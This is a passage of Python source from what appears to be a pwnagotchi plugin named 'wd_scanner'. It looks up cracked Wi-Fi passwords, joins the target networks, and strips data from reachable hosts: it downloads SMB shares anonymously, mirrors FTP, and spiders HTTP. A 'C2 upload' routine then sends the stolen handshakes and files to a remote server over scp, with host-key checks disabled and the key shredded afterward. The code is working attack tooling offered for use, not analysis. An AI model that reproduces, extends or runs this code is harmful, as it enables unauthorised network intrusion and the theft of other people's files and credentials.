        """Base directory for plunder loot."""
        return os.path.join(self._handshake_dir(), "wd_plunder")

    def _start_plunder(self, ssid, bssid, password, targets):
        """
        Initiate a plunder job.
        `targets` = list of {ip, ports: [{port, proto, service}]}
        """
        with self._lock:
            if self._action_running or self._recon_running or self._plunder_running:
                return False, "another operation is already running"
            self._plunder_running = True
            self._plunder_log = []
            self._plunder_thread = threading.Thread(
                target=self._plunder_worker,
                args=(ssid, bssid, password, targets),
                daemon=True,
            )
            self._plunder_thread.start()
            return True, "plunder started"

    def _plunder_worker(self, ssid, bssid, password, targets):
        """Connect to network, enumerate/download from all plunderable hosts."""
        agent = self._agent
        iface, was_shared, is_scan_iface = self._pick_recon_iface()
        if not iface:
            self._log_plunder("no usable interface for plunder")
            self._plunder_running = False
            return

        if is_scan_iface:
            self._log_plunder("using scan interface %s (will temporarily take over)" % iface)

        self._log_plunder("plunder target network: %s (%s)" % (ssid, bssid))

        # Filter out our own IP so we never plunder ourselves.
        # We don't have our IP yet (DHCP hasn't run), so also filter
        # after DHCP below. Pre-filter using any cached IP from the
        # recon report that triggered this plunder.
        self._log_plunder("hosts to plunder: %d" % len(targets))

        if not shutil.which("wpa_supplicant") or not shutil.which("dhclient"):
            self._log_plunder("wpa_supplicant/dhclient missing")
            self._plunder_running = False
            return

        if not self._wpa_psk_safe(password):
            self._log_plunder("password contains illegal characters; aborting")
            self._plunder_running = False
            return

        # Create loot directory.
        bsd = bssid.replace(":", "").lower()
        ts = int(time.time())
        loot_dir = os.path.join(self._plunder_dir(), "%s_%d" % (bsd, ts))
        os.makedirs(loot_dir, exist_ok=True)

        tmpdir = tempfile.mkdtemp(prefix="wd_plunder_")
        wpa_conf = os.path.join(tmpdir, "wpa_supplicant.conf")
        wpa_pid = os.path.join(tmpdir, "wpa_supplicant.pid")
        wpa_ctrl = os.path.join(tmpdir, "ctrl")
        dhcp_pid = os.path.join(tmpdir, "dhclient.pid")
        dhcp_lease = os.path.join(tmpdir, "dhclient.leases")

        try:
            os.makedirs(wpa_ctrl, exist_ok=True)
        except OSError:
            pass
        try:
            with open(wpa_conf, "w") as f:
                f.write(
                    "ctrl_interface=" + wpa_ctrl + "\n"
                    "update_config=0\n"
                    "network={\n"
                    "  ssid=\"" + ssid + "\"\n"
                    "  psk=\"" + password + "\"\n"
                    "  scan_ssid=1\n"
                    "  key_mgmt=WPA-PSK\n"
                    "}\n"
                )
            os.chmod(wpa_conf, 0o600)
        except OSError as e:
            self._log_plunder("couldn't write wpa config: %s" % e)
            self._plunder_running = False
            return

        t0 = time.time()
        bettercap_paused_here = False
        wpa_started = False
        manifest = {
            "ts": ts,
            "ssid": ssid,
            "bssid": bssid,
            "targets": [],
            "total_files": 0,
            "total_bytes": 0,
            "duration_seconds": 0,
            "log": [],
        }

        try:
            # Pause bettercap.
            try:
                agent.run("wifi.recon off")
                self._log_plunder("paused bettercap recon")
                bettercap_paused_here = True
            except Exception as e:
                self._log_plunder("could not pause bettercap: %s" % e)

            # Switch to managed mode.
            self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
            self._run(["iw", "dev", iface, "set", "type", "managed"], check=False, timeout=5)
            self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)

            # Start wpa_supplicant.
            self._log_plunder("associating with %s ..." % ssid)
            self._run([
                "wpa_supplicant", "-B", "-D", "nl80211,wext",
                "-i", iface, "-c", wpa_conf, "-P", wpa_pid,
            ], check=False, timeout=10)
            wpa_started = True

            # DHCP.
            self._log_plunder("requesting DHCP lease...")
            self._run([
                "dhclient", "-pf", dhcp_pid, "-lf", dhcp_lease,
                "-1", iface,
            ], check=False, timeout=self._recon_dwell + 5)

            ip = self._iface_ipv4(iface)
            if not ip:
                self._log_plunder("no IPv4 acquired; aborting plunder")
                return
            self._log_plunder("connected: ip=%s" % ip)

            # Never plunder ourselves.
            targets = [t for t in targets if t.get("ip") != ip]
            self._log_plunder("targets after excluding self (%s): %d" % (ip, len(targets)))

            # Plunder each host.
            deadline = t0 + self._plunder_seconds
            for t in targets:
                if time.time() > deadline:
                    self._log_plunder("time budget exhausted")
                    break
                host_ip = t["ip"]
                ports = t.get("ports") or []
                host_dir = os.path.join(loot_dir, host_ip.replace(".", "_"))
                os.makedirs(host_dir, exist_ok=True)
                host_manifest = {"ip": host_ip, "services": [], "files": 0, "bytes": 0}

                for p_info in ports:
                    if time.time() > deadline:
                        break
                    port = int(p_info.get("port") or 0)
                    service = (p_info.get("service") or "").lower()
                    remaining = max(10, int(deadline - time.time()))

                    if port in (445, 139) or "smb" in service or "microsoft-ds" in service or "netbios" in service:
                        n, b = self._plunder_smb(host_ip, host_dir, remaining)
                        host_manifest["services"].append({"port": port, "type": "smb", "files": n, "bytes": b})
                        host_manifest["files"] += n
                        host_manifest["bytes"] += b

                    elif port == 21 or "ftp" in service:
                        n, b = self._plunder_ftp(host_ip, host_dir, remaining)
                        host_manifest["services"].append({"port": port, "type": "ftp", "files": n, "bytes": b})
                        host_manifest["files"] += n
                        host_manifest["bytes"] += b

                    elif port in (80, 8080, 8000, 8888) or "http" in service:
                        scheme = "https" if port == 443 or port == 8443 or "https" in service else "http"
                        n, b = self._plunder_http(host_ip, port, scheme, host_dir, remaining)
                        host_manifest["services"].append({"port": port, "type": scheme, "files": n, "bytes": b})
                        host_manifest["files"] += n
                        host_manifest["bytes"] += b

                    elif port in (443, 8443) or "https" in service or "ssl" in service:
                        n, b = self._plunder_http(host_ip, port, "https", host_dir, remaining)
                        host_manifest["services"].append({"port": port, "type": "https", "files": n, "bytes": b})
                        host_manifest["files"] += n
                        host_manifest["bytes"] += b

                manifest["targets"].append(host_manifest)
                manifest["total_files"] += host_manifest["files"]
                manifest["total_bytes"] += host_manifest["bytes"]

            self._log_plunder("plunder complete: %d files, %s"
                              % (manifest["total_files"], self._human_bytes(manifest["total_bytes"])))

        except Exception as e:
            logging.exception("[wd_scanner] plunder failed")
            self._log_plunder("plunder failed: %s" % e)
        finally:
            # Tear down connection (same as recon).
            self._run(["dhclient", "-r", "-pf", dhcp_pid, "-lf", dhcp_lease, iface],
                      check=False, timeout=10)
            if wpa_started:
                self._run(["pkill", "-F", wpa_pid], check=False, timeout=5)
                self._run(
                    ["pkill", "-f", r"wpa_supplicant.*-i\s*%s(\s|$)" % re.escape(iface)],
                    check=False, timeout=5,
                )
            if was_shared or is_scan_iface:
                self._run(["ip", "link", "set", iface, "down"], check=False, timeout=5)
                self._run(["iw", "dev", iface, "set", "type", "monitor"], check=False, timeout=5)
                self._run(["ip", "link", "set", iface, "up"], check=False, timeout=5)
                if is_scan_iface and self._iface_cfg:
                    result_am = self._run(
                        ["airmon-ng", "start", iface], check=False, timeout=15
                    )
                    if result_am:
                        m = re.search(
                            r"monitor mode (?:vif )?enabled (?:for|on) (\w+)",
                            result_am, re.I,
                        )
                        if m:
                            self._mon_iface = m.group(1)
                            self._log_plunder("aux monitor restored: %s" % self._mon_iface)
            if bettercap_paused_here:
                try:
                    agent.run("wifi.recon on")
                    self._log_plunder("resumed bettercap recon")
                except Exception as e:
                    self._log_plunder("could not resume bettercap: %s" % e)

            manifest["duration_seconds"] = round(time.time() - t0, 1)
            manifest["log"] = list(self._plunder_log)

            # Save manifest.
            try:
                mpath = os.path.join(loot_dir, "manifest.json")
                with open(mpath, "w") as f:
                    json.dump(manifest, f, indent=2, default=str)
                self._log_plunder("manifest saved: %s" % mpath)
            except Exception as e:
                self._log_plunder("couldn't save manifest: %s" % e)

            try:
                shutil.rmtree(tmpdir, ignore_errors=True)
            except Exception:
                pass

            self._plunder_running = False

    def _plunder_smb(self, host, host_dir, timeout):
        """Enumerate and download SMB shares using smbclient."""
        smb_dir = os.path.join(host_dir, "smb")
        os.makedirs(smb_dir, exist_ok=True)
        total_files, total_bytes = 0, 0

        if not shutil.which("smbclient"):
            self._log_plunder("[%s] smbclient not installed, skipping SMB" % host)
            return 0, 0

        # List shares (anonymous).
        self._log_plunder("[%s] enumerating SMB shares..." % host)
        out = self._run(
            ["smbclient", "-L", host, "-N", "-g"],
            check=False, timeout=min(timeout, 15)
        ) or ""

        shares = []
        for line in out.splitlines():
            # Format: Disk|ShareName|Comment
            parts = line.split("|")
            if len(parts) >= 2 and parts[0].strip().lower() == "disk":
                name = parts[1].strip()
                # Skip common non-useful shares.
                if name.lower() not in ("ipc$", "print$"):
                    shares.append(name)

        if not shares:
            self._log_plunder("[%s] no accessible SMB shares found" % host)
            return 0, 0

        self._log_plunder("[%s] found %d SMB shares: %s" % (host, len(shares), ", ".join(shares)))

        for share in shares:
            if time.time() > (time.time() + timeout):
                break
            share_dir = os.path.join(smb_dir, re.sub(r"[^\w\-.]", "_", share))
            os.makedirs(share_dir, exist_ok=True)
            self._log_plunder("[%s] downloading share: %s" % (host, share))
            self._run(
                ["smbclient", "//%s/%s" % (host, share), "-N",
                 "-c", "recurse; prompt OFF; mget *"],
                check=False, timeout=min(timeout, 120),
                cwd=share_dir,
            )
            # Count what we got.
            for root, dirs, files in os.walk(share_dir):
                for fn in files:
                    fp = os.path.join(root, fn)
                    try:
                        total_bytes += os.path.getsize(fp)
                        total_files += 1
                    except OSError:
                        pass

        self._log_plunder("[%s] SMB done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
        return total_files, total_bytes

    def _plunder_ftp(self, host, host_dir, timeout):
        """Download from FTP via wget --mirror (anonymous)."""
        ftp_dir = os.path.join(host_dir, "ftp")
        os.makedirs(ftp_dir, exist_ok=True)

        if not shutil.which("wget"):
            self._log_plunder("[%s] wget not installed, skipping FTP" % host)
            return 0, 0

        self._log_plunder("[%s] mirroring FTP (anonymous)..." % host)
        self._run(
            ["wget", "--mirror", "-P", ftp_dir,
             "--no-host-directories",
             "--timeout=10", "--tries=2",
             "-q",
             "ftp://anonymous:plunder@%s/" % host],
            check=False, timeout=min(timeout, 180),
        )

        total_files, total_bytes = 0, 0
        for root, dirs, files in os.walk(ftp_dir):
            for fn in files:
                fp = os.path.join(root, fn)
                try:
                    total_bytes += os.path.getsize(fp)
                    total_files += 1
                except OSError:
                    pass

        self._log_plunder("[%s] FTP done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
        return total_files, total_bytes

    def _plunder_http(self, host, port, scheme, host_dir, timeout):
        """Spider an HTTP/HTTPS server with wget."""
        http_dir = os.path.join(host_dir, "%s_%d" % (scheme, port))
        os.makedirs(http_dir, exist_ok=True)

        if not shutil.which("wget"):
            self._log_plunder("[%s] wget not installed, skipping HTTP" % host)
            return 0, 0

        url = "%s://%s:%d/" % (scheme, host, port)
        self._log_plunder("[%s] spidering %s ..." % (host, url))
        self._run(
            ["wget", "--mirror", "--page-requisites", "--convert-links",
             "--no-parent", "--no-host-directories",
             "-e", "robots=off",
             "--timeout=10", "--tries=2",
             "--max-redirect=5",
             "-P", http_dir,
             "-q",
             "--no-check-certificate",
             url],
            check=False, timeout=min(timeout, 180),
        )

        total_files, total_bytes = 0, 0
        for root, dirs, files in os.walk(http_dir):
            for fn in files:
                fp = os.path.join(root, fn)
                try:
                    total_bytes += os.path.getsize(fp)
                    total_files += 1
                except OSError:
                    pass

        self._log_plunder("[%s] HTTP done: %d files, %s" % (host, total_files, self._human_bytes(total_bytes)))
        return total_files, total_bytes

    @staticmethod
    def _human_bytes(n):
        """Human-readable byte count."""
        for unit in ("B", "KB", "MB", "GB"):
            if abs(n) < 1024:
                return "%.1f %s" % (n, unit)
            n /= 1024.0
        return "%.1f TB" % n

    def _list_plunder_jobs(self):
        """Return list of plunder jobs (manifest.json in each subdir)."""
        base = self._plunder_dir()
        if not os.path.isdir(base):
            return []
        jobs = []
        try:
            for d in sorted(os.listdir(base), reverse=True):
                full = os.path.join(base, d)
                mf = os.path.join(full, "manifest.json")
                if os.path.isdir(full) and os.path.exists(mf):
                    try:
                        with open(mf, "r") as f:
                            manifest = json.load(f)
                        manifest["_dir"] = d
                        manifest["_path"] = full
                        jobs.append(manifest)
                    except (OSError, ValueError):
                        pass
        except OSError:
            pass
        return jobs

    def _plunder_loot_files(self, job_dir):
        """Walk a plunder job directory and return relative paths to all files."""
        files = []
        if not os.path.isdir(job_dir):
            return files
        for root, dirs, fnames in os.walk(job_dir):
            for fn in fnames:
                if fn == "manifest.json":
                    continue
                fp = os.path.join(root, fn)
                rel = os.path.relpath(fp, job_dir)
                try:
                    sz = os.path.getsize(fp)
                except OSError:
                    sz = 0
                files.append({"path": rel, "size": sz, "abs": fp})
        files.sort(key=lambda f: f["path"])
        return files

    @staticmethod
    def _recon_filename(bssid):
        bsd = bssid.replace(":", "").lower()
        return "wd_recon_%s_%d.json" % (bsd, int(time.time()))

    @staticmethod
    def _derive_subnet(ip):
        """Return (network, prefix) clamped to /24 to keep the sweep finite."""
        parts = ip.split(".")
        if len(parts) != 4:
            return ip, 32
        return "%s.%s.%s.0" % (parts[0], parts[1], parts[2]), 24

    def _iface_ipv4(self, iface):
        out = self._run(["ip", "-4", "-o", "addr", "show", "dev", iface],
                        check=False, timeout=5) or ""
        m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else None

    def _iface_default_gw(self):
        out = self._run(["ip", "-4", "route", "show", "default"],
                        check=False, timeout=5) or ""
        m = re.search(r"default\s+via\s+(\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else None

    @staticmethod
    def _parse_nmap_alive(out):
        hosts = []
        # Matches both "Nmap scan report for 192.168.1.1" and
        # "Nmap scan report for foo.local (192.168.1.1)".
        pat = re.compile(r"Nmap scan report for (?:.+?\()?(\d+\.\d+\.\d+\.\d+)\)?")
        for line in (out or "").splitlines():
            m_ = pat.search(line)
            if m_:
                hosts.append(m_.group(1))
        # de-dup, preserve order
        seen = set(); ordered = []
        for h in hosts:
            if h in seen: continue
            seen.add(h); ordered.append(h)
        return ordered

    @staticmethod
    def _parse_nmap_ports(out):
        """Map host -> [ {port, proto, service} ]. Best-effort plain-text parse."""
        result = {}
        host = None
        pat = re.compile(r"Nmap scan report for (?:.+?\()?(\d+\.\d+\.\d+\.\d+)\)?")
        for line in (out or "").splitlines():
            m_h = pat.match(line)
            if m_h:
                host = m_h.group(1)
                result.setdefault(host, [])
                continue
            if host:
                m_p = re.match(r"^(\d+)/(tcp|udp)\s+open\s+(\S+)", line)
                if m_p:
                    result[host].append({
                        "port": int(m_p.group(1)),
                        "proto": m_p.group(2),
                        "service": m_p.group(3),
                    })
        # drop hosts with no open ports
        return {h: ps for h, ps in result.items() if ps}

    def _list_recon_reports(self):
        """Return reports sorted newest-first."""
        path = self._handshake_dir()
        if not path or not os.path.isdir(path):
            return []
        out = []
        try:
            for n in os.listdir(path):
                if not (n.startswith("wd_recon_") and n.endswith(".json")):
                    continue
                full = os.path.join(path, n)
                try:
                    st = os.stat(full)
                    out.append({"name": n, "path": full, "mtime": st.st_mtime})
                except OSError:
                    continue
        except OSError:
            return []
        out.sort(key=lambda r: r["mtime"], reverse=True)
        return out

    def _load_recon_report(self, name):
        if not re.match(r"^wd_recon_[0-9a-f]{12}_\d+\.json$", name or ""):
            return None
        full = os.path.join(self._handshake_dir(), name)
        try:
            with open(full, "r") as f:
                return json.load(f)
        except (OSError, ValueError):
            return None

    def _load_cracked_index(self):
        """
        Walk the pwnagotchi handshake directory and return:
            {
                bssid_lower: password,
                "ssid::" + ssid_lower: password,   # secondary key
            }

        Pwnagotchi itself doesn't crack, but its companion plugins
        (quickdic, online_hashcrack, wpa-sec, etc.) drop the recovered key
        next to the pcap as one of:
            <essid>_<bssid>.cracked
            <essid>_<bssid>.pmkid.cracked
            <essid>_<bssid>.cracked.pcap         (sometimes just a marker)
            <essid>_<bssid>.pcap.cracked
        and there's often a shared <handshakes>/wpa-sec.cracked.potfile
        in hashcat's `BSSID:PASSWORD:ESSID:KEY` (or similar) format.
        We try to be permissive about all of these.
        """
        idx = {}
        path = self._handshake_dir()
        if not path or not os.path.isdir(path):
            return idx

        # Pattern A: per-handshake "<essid>_<bssid>[.something].cracked" sidecars.
        # Filename convention: pwnagotchi sanitises bssid into 12 hex chars (no colons).
        try:
            entries = os.listdir(path)
        except OSError:
            return idx

        for name in entries:
            full = os.path.join(path, name)
            lower = name.lower()
            if not (lower.endswith(".cracked")
                    or lower.endswith(".cracked.pcap")
                    or lower.endswith(".pcap.cracked")
                    or lower.endswith(".pmkid.cracked")):
                continue

            stem = re.sub(r"\.(pmkid\.)?cracked(\.pcap)?$", "", name, flags=re.I)
            stem = re.sub(r"\.pcap\.cracked$", "", stem, flags=re.I)
            # split on the LAST underscore to separate essid from bssid-hex
            m_split = re.match(r"^(.*)_([0-9a-fA-F]{12})$", stem)
            essid_part = m_split.group(1) if m_split else stem
            bssid_hex = m_split.group(2).lower() if m_split else None

            password = None
            try:
                with open(full, "r", errors="replace") as f:
                    raw = f.read().strip()
            except OSError:
                continue

            if raw:
                # Some sidecars are just the password on one line; others are
                # JSON-ish or hashcat lines like "bssid:password" /
                # "bssid:pmkid:essid:password".
                if "\n" in raw:
                    raw = raw.splitlines()[0].strip()
                parts = raw.split(":")
                if len(parts) >= 4:
                    password = parts[-1]
                elif len(parts) == 2:
                    password = parts[1]
                else:
                    password = raw

            if not password:
                # File existed but was empty; treat as "marker only"
                password = "<recovered>"

            if bssid_hex:
                # Re-format as colon-separated lower hex.
                pretty = ":".join(bssid_hex[i:i+2] for i in range(0, 12, 2))
                idx[pretty] = password
            if essid_part:
                idx["ssid::" + essid_part.lower()] = password
                idx.setdefault("__origcase__::" + essid_part.lower(), essid_part)

        # Pattern B: a shared potfile (one entry per line).
        for fname in ("wpa-sec.cracked.potfile", "wpa-sec.potfile",
                      "online_hashcrack.cracked", "cracked.potfile"):
            potfile = os.path.join(path, fname)
            if not os.path.isfile(potfile):
                continue
            try:
                with open(potfile, "r", errors="replace") as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith("#"):
                            continue
                        parts = line.split(":")
                        bssid_raw, essid, password = None, None, None
                        if len(parts) >= 4:
                            # hashcat: bssid:station:essid:password   OR
                            #         pmkid:station:essid:password
                            bssid_raw = parts[0]
                            essid = parts[2]
                            password = parts[-1]
                        elif len(parts) == 3:
                            bssid_raw, essid, password = parts
                        elif len(parts) == 2:
                            bssid_raw, password = parts
                        if bssid_raw and re.match(r"^[0-9a-fA-F]{12}$", bssid_raw):
                            pretty = ":".join(bssid_raw[i:i+2].lower()
                                              for i in range(0, 12, 2))
                            idx.setdefault(pretty, password or "<recovered>")
                        elif bssid_raw and re.match(
                                r"^[0-9a-fA-F:]{17}$", bssid_raw):
                            idx.setdefault(bssid_raw.lower(),
                                           password or "<recovered>")
                        if essid:
                            idx.setdefault("ssid::" + essid.lower(),
                                           password or "<recovered>")
                            idx.setdefault("__origcase__::" + essid.lower(), essid)
            except OSError:
                continue

        return idx

    # ----------------------------------------------------------------- updater

    def _self_path(self):
        """Absolute path to this plugin file on disk."""
        return os.path.abspath(__file__)

    def _sha256_of_self(self):
        with open(self._self_path(), "rb") as f:
            return hashlib.sha256(f.read()).hexdigest()

    @staticmethod
    def _parse_version(blob):
        """Extract the value of __version__ from a chunk of source bytes/str."""
        if isinstance(blob, bytes):
            try:
                blob = blob.decode("utf-8", errors="replace")
            except Exception:
                return None
        m = re.search(r'__version__\s*=\s*[\'"]([^\'"]+)[\'"]', blob)
        return m.group(1) if m else None

    def _maybe_run_update_check(self, force=False):
        """Kick a background thread to check for updates, rate-limited."""
        with self._update_lock:
            if self._update_in_flight:
                return
            now = time.time()
            if (not force) and (now - self._update_last_check) < self._update_check_interval:
                return
            self._update_in_flight = True

        t = threading.Thread(target=self._update_worker, args=(force,), daemon=True)
        self._update_thread = t
        t.start()

    def _update_worker(self, force):
        try:
            self._do_update_check(install=self._update_auto_install or force)
        except Exception as e:
            logging.exception("[wd_scanner] update worker failed")
            self._update_last_status = "error: %s" % e
        finally:
            self._update_last_check = time.time()
            with self._update_lock:
                self._update_in_flight = False

    def _do_update_check(self, install):
        """Fetch remote, compare, optionally install."""
        url = self._update_url
        logging.info("[wd_scanner] checking %s for updates", url)
        try:
            req = urllib.request.Request(
                url,
                headers={
                    "User-Agent": "wd_scanner/%s (+pwnagotchi)" % self.__version__,
                    "Cache-Control": "no-cache",
                },
            )
            with urllib.request.urlopen(req, timeout=20) as resp:
                if resp.status != 200:
                    self._update_last_status = "http %d" % resp.status
                    return
                data = resp.read()
        except Exception as e:
            self._update_last_status = "fetch error: %s" % e
            logging.warning("[wd_scanner] update fetch failed: %s", e)
            return

        if len(data) < 1024 or len(data) > 4 * 1024 * 1024:
            self._update_last_status = "remote size suspicious (%d bytes)" % len(data)
            return

        # Sanity: must look like a Python file declaring our class.
        text = data.decode("utf-8", errors="replace")
        if "class WdScanner" not in text:
            self._update_last_status = "remote does not look like wd_scanner"
            return

        remote_sha = hashlib.sha256(data).hexdigest()
        remote_ver = self._parse_version(data)
        local_sha = self._update_local_sha or self._sha256_of_self()
        self._update_remote_sha = remote_sha
        self._update_remote_version = remote_ver
        self._update_local_sha = local_sha

        if remote_sha == local_sha:
            self._update_last_status = "up-to-date"
            logging.info("[wd_scanner] up-to-date (sha %s)", remote_sha[:12])
            return

        # Bytes differ. Validate it parses as Python before we touch disk.
        try:
            compile(data, "<wd_scanner-remote>", "exec")
        except SyntaxError as e:
            self._update_last_status = "remote has syntax error: %s" % e
            logging.error("[wd_scanner] remote rejected: %s", e)
            return

        if not install:
            self._update_last_status = "update available: v%s" % (remote_ver or "?")
            return

        # Install: write atomically to <self>.new, fsync, rename.
        target = self._self_path()
        target_dir = os.path.dirname(target)
        backup = target + ".bak"
        staged = target + ".new"
        try:
            with open(staged, "wb") as f:
                f.write(data)
                try:
                    f.flush(); os.fsync(f.fileno())
                except OSError:
                    pass
            try:
                if os.path.exists(target):
                    shutil.copy2(target, backup)
            except Exception as e:
                logging.warning("[wd_scanner] could not back up current file: %s", e)
            os.replace(staged, target)
            # Drop any stale bytecode so the new file is recompiled on restart.
            try:
                pyc_dir = os.path.join(target_dir, "__pycache__")
                if os.path.isdir(pyc_dir):
                    for n in os.listdir(pyc_dir):
                        if n.startswith(os.path.basename(target).replace(".py", "")):
                            try:
                                os.remove(os.path.join(pyc_dir, n))
                            except OSError:
                                pass
            except Exception:
                pass

            self._update_local_sha = remote_sha
            self._update_pending_restart = True
            self._update_last_status = "installed v%s — restart to activate" % (
                remote_ver or remote_sha[:8]
            )
            logging.info(
                "[wd_scanner] installed update v%s sha=%s; restart pwnagotchi to activate",
                remote_ver, remote_sha[:12],
            )
        except Exception as e:
            self._update_last_status = "install error: %s" % e
            logging.exception("[wd_scanner] failed to install update")
            try:
                if os.path.exists(staged):
                    os.remove(staged)
            except OSError:
                pass

    def _handshake_dir(self):
        # Pwnagotchi stores the handshake dir at config.bettercap.handshakes.
        cfg = None
        try:
            cfg = self._agent.config()  # newer pwnagotchi
        except Exception:
            cfg = getattr(self._agent, "_config", None)
        if not isinstance(cfg, dict):
            try:
                import pwnagotchi
                cfg = getattr(pwnagotchi, "config", None) or {}
            except Exception:
                cfg = {}
        path = (cfg.get("bettercap") or {}).get("handshakes") if isinstance(cfg, dict) else None
        return path or "/root/handshakes"

    @staticmethod
    def _snapshot_handshakes(path):
        if not path or not os.path.isdir(path):
            return []
        return os.listdir(path)

    def _export_target_data(self, bssid):
        """Export all data for a specific BSSID as tar.gz."""
        handshake_dir = self._handshake_dir()
        bssid_clean = bssid.replace(":", "").lower()

        # Find all files related to this BSSID.
        files_to_export = []
        for fname in os.listdir(handshake_dir):
            if bssid_clean in fname.lower():
                files_to_export.append(fname)

        if not files_to_export:
            return None

        # Create tar.gz archive.
        archive_name = "wd_export_%s_%d.tar.gz" % (bssid_clean, int(time.time()))
        archive_path = os.path.join(handshake_dir, archive_name)

        try:
            import tarfile
            with tarfile.open(archive_path, "w:gz") as tar:
                for fname in files_to_export:
                    fpath = os.path.join(handshake_dir, fname)
                    tar.add(fpath, arcname=fname)
            return archive_name
        except Exception as e:
            logging.error("[wd_scanner] export failed: %s", e)
            return None

    # ------------------------------------------------------------------- shell

    @staticmethod
    def _run(argv, check=True, timeout=30, cwd=None):
        try:
            r = subprocess.run(
                argv,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                timeout=timeout,
                cwd=cwd,
            )
            if check and r.returncode != 0:
                logging.warning(
                    "[wd_scanner] %s returned %d: %s",
                    argv[0], r.returncode, r.stdout.decode(errors="replace"),
                )
            return r.stdout.decode(errors="replace")
        except FileNotFoundError:
            return ""
        except subprocess.TimeoutExpired:
            return ""

    # ------------------------------------------------------------- C2 upload

    def _log_c2(self, msg):
        """Log C2 upload messages."""
        ts = time.strftime("%H:%M:%S")
        line = "[%s] %s" % (ts, msg)
        self._c2_upload_log.append(line)
        if len(self._c2_upload_log) > 200:
            self._c2_upload_log = self._c2_upload_log[-200:]
        logging.info("[wd_scanner.c2] %s", msg)

    def _start_c2_upload(self, ssh_key_pem, target_bssid=None):
        """Start C2 upload with ephemeral SSH key (never written to disk)."""
        with self._lock:
            if self._c2_upload_running:
                return False, "upload already in progress"
            if not self._c2_host:
                return False, "C2 host not configured"
            if not ssh_key_pem:
                return False, "SSH key required"

            self._c2_upload_running = True
            self._c2_upload_log = []
            self._c2_upload_thread = threading.Thread(
                target=self._c2_upload_worker,
                args=(ssh_key_pem, target_bssid),
                daemon=True,
            )
            self._c2_upload_thread.start()
            return True, "upload started"

    def _c2_upload_worker(self, ssh_key_pem, target_bssid):
        """Upload data to C2 server via SSH. Key is in-memory only."""
        try:
            self._log_c2(">>> C2 UPLOAD STARTED")
            self._log_c2("target: %s" % self._c2_host)

            if not shutil.which("ssh"):
                self._log_c2("ERROR: ssh not found on PATH")
                return

            # Parse C2 host.
            parts = self._c2_host.split("@")
            if len(parts) != 2:
                self._log_c2("ERROR: invalid C2 host format (expected user@host:port)")
                return
            user = parts[0]
            host_port = parts[1].split(":")
            host = host_port[0]
            port = host_port[1] if len(host_port) > 1 else "22"

            # Create ephemeral key file in tmpfs (/dev/shm).
            tmpdir = tempfile.mkdtemp(prefix="wd_c2_", dir="/dev/shm")
            key_file = os.path.join(tmpdir, "key")

            try:
                # Write key to tmpfs (RAM-only).
                with open(key_file, "w") as f:
                    f.write(ssh_key_pem)
                os.chmod(key_file, 0o600)
                self._log_c2("ephemeral key created in tmpfs (RAM only)")

                # Determine what to upload.
                handshake_dir = self._handshake_dir()
                files_to_upload = []

                if target_bssid:
                    # Upload specific target.
                    bssid_clean = target_bssid.replace(":", "").lower()
                    for fname in os.listdir(handshake_dir):
                        if bssid_clean in fname.lower():
                            files_to_upload.append(os.path.join(handshake_dir, fname))
                    self._log_c2("uploading %d files for %s" % (len(files_to_upload), target_bssid))
                else:
                    # Upload everything.
                    for fname in os.listdir(handshake_dir):
                        fpath = os.path.join(handshake_dir, fname)
                        if os.path.isfile(fpath):
                            files_to_upload.append(fpath)
                    self._log_c2("uploading %d files (all data)" % len(files_to_upload))

                if not files_to_upload:
                    self._log_c2("no files to upload")
                    return

                # Create remote directory named after hostname.
                hostname = socket.gethostname()
                remote_dir = "/tmp/wd_upload_%s_%d" % (hostname, int(time.time()))

                self._log_c2("creating remote directory: %s" % remote_dir)
                mkdir_cmd = [
                    "ssh",
                    "-i", key_file,
                    "-p", port,
                    "-o", "StrictHostKeyChecking=no",
                    "-o", "UserKnownHostsFile=/dev/null",
                    "-o", "BatchMode=yes",
                    "%s@%s" % (user, host),
                    "mkdir -p %s" % remote_dir
                ]

                result = self._run(mkdir_cmd, check=False, timeout=30)
                if result and "error" in result.lower():
                    self._log_c2("WARNING: mkdir: %s" % result[:100])

                # Upload files via scp.
                for fpath in files_to_upload:
                    fname = os.path.basename(fpath)
                    self._log_c2("uploading %s..." % fname)

                    scp_cmd = [
                        "scp",
                        "-i", key_file,
                        "-P", port,
                        "-o", "StrictHostKeyChecking=no",
                        "-o", "UserKnownHostsFile=/dev/null",
                        "-o", "BatchMode=yes",
                        fpath,
                        "%s@%s:%s/" % (user, host, remote_dir)
                    ]

                    result = self._run(scp_cmd, check=False, timeout=120)
                    if result and "error" in result.lower():
                        self._log_c2("  FAILED: %s" % result[:100])
                    else:
                        self._log_c2("  OK: %s" % fname)

                self._log_c2("upload complete: %s" % remote_dir)

            finally:
                # Shred key file and remove tmpdir.
                try:
                    if os.path.exists(key_file):
                        # Overwrite with random data before deletion.
                        with open(key_file, "wb") as f:
                            f.write(os.urandom(os.path.getsize(key_file)))
                        os.remove(key_file)
                    shutil.rmtree(tmpdir)
                    self._log_c2("ephemeral key destroyed")
                except Exception as e:
                    self._log_c2("WARNING: key cleanup failed: %s" % e)

        except Exception as e:
            self._log_c2("ERROR: %s" % e)
            logging.exception("[wd_scanner.c2] upload failed")
        finally:
            self._c2_upload_running = False

    # -------------------------------------------------------------------- HTTP

    def on_webhook(self, path, request):
        # Lazy import so the file is importable on a workstation for linting.
        from flask import abort, jsonify, redirect, request as flask_request

        # `request` may be passed positionally by some pwnagotchi versions,
        # otherwise fall back to the thread-local.
        req = request or flask_request

        norm = (path or "").lstrip("/")

        if req.method == "POST" and norm == "select":
            name = (req.form.get("interface") or "").strip()
            ok, msg = self._select_iface(name)
            if not ok:
                self._select_error = msg
            else:
                self._start_bg_monitor()
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "release":
            self._stop_bg_monitor()
            self._release_iface()
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "select_passive":
            name = (req.form.get("interface") or "").strip()
            ok, msg = self._select_passive_iface(name)
            if not ok:
                self._select_error = msg
            return redirect("/plugins/wd_scanner/")

        if req.method == "POST" and norm == "release_passive":
            self._stop_passive_monitor()
            self._release_passive_iface()
            return redirect("/plugins/wd_scanner/")

